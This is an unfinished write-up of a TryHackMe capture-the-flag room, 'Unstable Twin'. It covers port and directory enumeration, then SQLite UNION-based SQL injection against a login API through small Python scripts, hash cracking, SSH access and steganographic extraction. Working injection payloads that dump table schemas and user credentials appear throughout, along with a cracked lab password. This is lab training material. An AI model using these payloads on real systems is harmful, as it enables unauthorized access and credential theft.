***STILL N THE WORKS!***

Room: [Unstable Twin](https://tryhackme.com/room/unstabletwin)

Difficulty: Medium

Overview:



-------------------------------------------------------------------------------------------------------------------------------------------------------------------

First we will start off our target enumeration by doing "Nmap" scan:

nmap -sV -sC -A -p- 10.10.121.127 -oN nmap.txt -T4

10.10.121.127 - room ip address

![nmap](https://user-images.githubusercontent.com/76821053/119569292-74feab80-bda6-11eb-94d8-abcdc12f2fa0.png)

There are two ports open:

22    →  OpenSSH 8.0

53    →  http server nginx 1.14.1

Lets check for hidden directories with a "Gobuster" scan:

![gobuster](https://user-images.githubusercontent.com/76821053/119570948-a8dad080-bda8-11eb-9959-bbf3511f6684.png)

The website doesn't have anything..

![emptyweb](https://user-images.githubusercontent.com/76821053/119571098-d9bb0580-bda8-11eb-8dfe-9c5d55e7122c.png)

It is empty, besides the /info directory i found with gobuster:

![webinfo](https://user-images.githubusercontent.com/76821053/119571268-0d962b00-bda9-11eb-9135-8e63697dd282.png)

Using "curl" we will try to get more information from the http headers:



Found the build version number for Vincent server:

![curlxget](https://user-images.githubusercontent.com/76821053/119571524-5a7a0180-bda9-11eb-8536-6795514063ec.png)

Since there was a json file in the directory i did a GET request with option -H to accept application/json:

![jsonfilecurl](https://user-images.githubusercontent.com/76821053/120120298-3432d800-c194-11eb-9f09-3058d585b789.png)

Found a new build number and a new server name.

Now the room hinted that the server is vulnerable to sql injection, i need to find a way point to exploit it.

The server talks about “login API” so i try to see if there is anykind of vulnerability there:

 
 
 Know i know that i can reach /api/login and that if i ran the command 2 times it gives me different ouputs. Meaning that there is 2 servers probably and they read from diferent builds 1.3.4-dev and 1.3.6-final.

To start testing for vulnerabilities i wrote a simple python script:

Payloadallthethings:



I started editing the script doing:

1' UNION SELECT 1--+ '"
1' UNION SELECT 1,2--+ '"
1' UNION SELECT 1,2,3--+ '"
1' UNION SELECT 1,2,3,4--+ '"

till i got some kind of response from the server.. even dough the server was not ouputing errors and i found something.


import requests

payload = "1' UNION SELECT 1,2--+ '"
url = ' http://unstabletwin.thm/api/login'

data = {"username": payload , "password": 12345}
r = requests.post(url, data)
print(r.text)



I ran the script and got a call back:



Again i had to run the script twice, because there is 2 servers.

So i found that the server has 2 tables. Now i need to know what is their names.

From payloadallthethings sqlite injection:



To find version of mysql:



I need to modify 



To display the names of the tables i used the Integer/string based - Extract table name from payloadall..

import requests

payload = ["1' UNION SELECT 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--+ '"]
url = ' http://unstabletwin.thm/api/login'

data = {"username": payload , "password": 12345}

for i in payload:
        r = requests.post(url, data)
        print(r.text)
        r = requests.post(url, data)
        print(r.text)
        
        
When i combine the new string injection i needed to had number 1, like so:

original: 

SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'

altered separated by a “,” :

SELECT 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'

merged strings like so:

1' UNION SELECT 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--+ '


I also created a for loop to make the request two times, so in don't have to rerun the script . 
 
 



Now to read the contents of the tables i will again modify the script and to be able to read the columns:



I modified the string like so:

original:

SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'

merged:

1' UNION SELECT 1, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'--+ '

Added the 1, and substitute the ‘table_name’ for the users which was the 1 table name






With this information i can now reach its contents.

To list users and passwords:

UNION SELECT username, password FROM users

then merged in the script:

1' UNION SELECT username, password FROM users--+








Now the same process to read the contents of "notes":

original:

SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'

merged:

1' UNION SELECT 1, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='notes'--+





To extract information:

string:

SELECT notes FROM notes

merged:

1' UNION SELECT 1, notes FROM notes--+





Found a password:

eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4

I used hash-identifier:



I used john the ripper to decrypt the hash:



i could also use crackstation.net to do this:



Password: experiment

Now that i have a password i will use ssh to connect to the target machine.

I assume that the user that has this password is mary_ann, because when i was enumerating the server mary_ann didn't had a colour but instead a ..continue..



I ran linpeas, did manual enumeration and only found a clue:



the content of server_notes.txt:



The api must have more information hidden so i used curl to try and download the images hinted on the message:

curl -v http://unstabletwin.thm/get_image?name=vincent --output vincent.jpg 












I did this command for every user and downloaded all the files in .jpg format.

example images:



Since they were all images i used steghide to see if there was any hidden content and i was right:



I read the contents of each extracted files:



There was a tip about arranging the children by the colours of the rainbow.



So i merged a big string from contents of each extracted file in rainbow colour order from red to green:

1DVsdb2uEE0k5HK4GAIZPS0Mby2jomUKLjvQ4OSwjKLNAAeCdl2J8BCRuXVXeVYvs6J6HKpZWPG8pfeHoNG1

I tried many different decoders till i find the right one at https://gchq.github.io/CyberChef/:



The string was base62.
